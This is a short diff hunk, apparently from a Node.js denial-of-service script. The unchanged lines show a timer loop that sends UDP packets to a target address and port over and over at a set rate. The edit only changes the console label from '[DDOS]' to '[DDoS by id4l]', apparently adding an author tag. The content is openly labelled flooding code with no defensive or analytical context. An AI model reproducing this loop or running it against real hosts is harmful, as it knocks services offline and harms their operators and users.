@@ -18,5 +18,5 @@ client.on('error', (e) => {
 
 setInterval(() => {
     client.send('', 0, 0, port, address);
-    console.log(`[DDOS] Sending packets to ${address}:${port}...`)
+    console.log(`[DDoS by id4l] Sending packets to ${address}:${port}...`)
 }, (1000 / (times <= 0 ? 1000 : times)))
